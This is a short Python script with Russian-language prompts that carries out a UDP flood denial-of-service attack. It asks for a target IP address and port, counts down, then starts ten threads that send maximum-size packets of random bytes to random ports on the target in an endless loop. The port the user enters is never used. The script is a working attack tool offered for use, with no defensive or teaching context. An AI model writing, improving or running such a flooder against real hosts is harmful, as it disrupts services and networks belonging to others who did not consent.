import socket
import random
import time
import threading

print('данная атака сработает закрытые порты цели- в состояние closed, не filtred')
ip = input("Введи IP-адрес цели: ")
port = int(input("Введи порт для атаки: "))

print('до старта: 3')
time.sleep(1)
print('до старта: 2')
time.sleep(1)
print('до старта: 1')
time.sleep(1)

# Функция для атаки
def dos_attack(ip, port):
    random_port = random.randint(1, 65535)
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(65507)  # Увеличиваем размер пакетов
    while True:
            client.sendto(bytes_to_send, (ip, random_port))
            print(f"+ Отправлено на {ip}:{random_port} ")
        
# Запуск нескольких потоков
def run_attack():
    for _ in range(10):  # 10 потоков для атаки
        thread = threading.Thread(target=dos_attack, args=(ip, port))
        thread.start()

run_attack()
